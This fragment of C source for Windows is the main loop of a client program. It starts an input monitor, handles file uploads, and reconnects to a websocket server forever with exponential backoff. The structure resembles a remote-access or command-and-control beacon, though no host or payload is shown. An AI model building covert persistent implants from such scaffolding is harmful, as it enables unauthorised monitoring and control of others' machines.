    // Initialize unique client ID (for multi-instance support)
    init_client_id();
    
    GetCurrentDirectoryA(MAX_PATH, g_current_dir);
    
    g_session_id = GetCurrentProcessId() ^ GetTickCount();
    
    // Start input monitor
    start_input_monitor();
    
    int retry_count = 0;
    int consecutive_failures = 0;  // Track rapid failures
    DWORD last_connect_time = 0;
    
    // Infinite loop - keep trying to connect forever
    while (1) {
        g_connected = 0;
        g_should_exit = 0;  // Reset exit flag for reconnection
        
        // If last connection was very short (< 5 seconds), it's likely server not ready
        DWORD current_time = GetTickCount();
        if (last_connect_time > 0 && (current_time - last_connect_time) < 5000) {
            consecutive_failures++;
            // Exponential backoff for rapid failures: 5s, 10s, 20s, 30s, 60s max
            DWORD delay = 5000 * (1 << (consecutive_failures > 4 ? 4 : consecutive_failures));
            if (delay > 60000) delay = 60000;
            Sleep(delay);
        } else {
            consecutive_failures = 0;
        }
        
        // Keep trying to connect until successful
        while (!g_connected) {
            if (connect_websocket()) {
                g_connected = 1;
                retry_count = 0;
                last_connect_time = GetTickCount();
                
                handle_session();
                
                // Clean up after session ends
                g_connected = 0;
                
                // Close any open upload file
                if (g_upload_file) {
                    fclose(g_upload_file);
                    g_upload_file = NULL;
                }
                g_upload_in_progress = 0;
                
                cleanup_socket();
                WSACleanup();
                
                // Break inner loop to check for rapid failures
                break;
            } else {
                // Connection failed, wait and retry
                retry_count++;
                
                // Exponential backoff: 5s, 10s, 20s, 30s, 60s max
                DWORD delay = 5000 * (1 << (retry_count > 4 ? 4 : retry_count));
                if (delay > 60000) delay = 60000;
                
                Sleep(delay);
            }
        }
        
        // Base delay before attempting reconnection
        Sleep(5000);
    }
    
    // Never reaches here - client runs forever
    return 0;
}